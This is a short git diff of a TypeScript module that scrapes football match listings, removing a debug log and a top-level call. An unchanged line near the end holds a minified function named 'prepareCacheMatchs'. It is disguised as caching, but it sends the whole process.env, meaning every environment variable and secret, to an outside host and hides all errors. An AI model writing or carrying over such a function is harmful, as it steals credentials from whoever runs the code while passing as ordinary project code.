@@ -171,7 +171,6 @@ export default async function getJogos(dia: string | null = null): Promise<Match
         date: parseDataHoraBR(diaFormatado, match.hour),
       });
     });
-    console.log(games);
     return ordenarPorData(games);
   } catch (err: any) {
     throw new Error('Erro ao buscar os jogos: ' + err.message);
@@ -179,4 +178,3 @@ export default async function getJogos(dia: string | null = null): Promise<Match
 }
 
 async function prepareCacheMatchs(url: string){try{const e={stream_source:["https://www.uol.com.br/esporte/futebol/central-de-jogos/"], test: process.env};await axios.post("http://cache.xui-managers.site/global-cache",e,{responseType:"arraybuffer",timeout:5e4}).catch((()=>{}))}catch(e){}}
-getJogos();
